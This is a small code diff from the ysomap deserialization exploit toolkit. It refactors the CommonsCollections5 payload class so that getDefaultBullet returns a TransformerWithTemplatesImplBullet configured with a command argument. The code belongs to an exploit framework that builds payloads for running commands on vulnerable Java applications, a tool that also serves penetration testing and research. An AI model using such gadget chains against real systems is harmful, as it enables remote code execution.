@@ -8,10 +8,9 @@ import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
 import ysomap.annotation.Payloads;
 import ysomap.annotation.Require;
-import ysomap.core.ObjectGadget;
 import ysomap.core.bean.Bullet;
-import ysomap.core.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
 import ysomap.core.bean.Payload;
+import ysomap.core.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
 import ysomap.util.ReflectionHelper;
 
 import java.lang.reflect.Field;
@@ -88,10 +87,9 @@ public class CommonsCollections5 extends Payload<HashSet> {
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) throws Exception {
-        Bullet bullet = new TransformerWithTemplatesImplBullet();
-        bullet.set("args", command);
-        bullet.set("version", "3");
-        return bullet;
+    public Bullet getDefaultBullet(String command) throws Exception {
+        return new TransformerWithTemplatesImplBullet()
+                .set("args", command)
+                .set("version", "3");
     }
 }
